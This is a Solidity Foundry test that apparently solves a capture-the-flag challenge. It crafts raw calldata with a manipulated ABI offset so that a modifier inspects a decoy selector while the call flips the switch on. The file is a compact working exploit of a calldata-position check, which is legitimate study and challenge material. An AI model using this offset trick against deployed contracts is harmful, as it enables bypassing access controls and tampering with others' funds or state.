// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Switch} from "../Switch.sol";

contract SwitchTest is Test {
    Switch switchh;
    function setUp() public {
        switchh = new Switch();
    }
    function test_Challenge29_Passed() public {
        bytes memory callData = abi.encodePacked(
            Switch.flipSwitch.selector,                  // 0x00: 4 bytes
            uint256(0x60),                               // 0x04: offset -> length lives at 0x64
            uint256(0),                                  // 0x24: filler
            bytes32(Switch.turnSwitchOff.selector),      // 0x44: decoy the modifier reads
            uint256(4),                                  // 0x64: length of _data
            bytes32(Switch.turnSwitchOn.selector)        // 0x84: real _data
        );
        (bool success,) = address(switchh).call(callData);
        require(success, "call failed");
        assertEq(switchh.switchOn(), true);
    }
}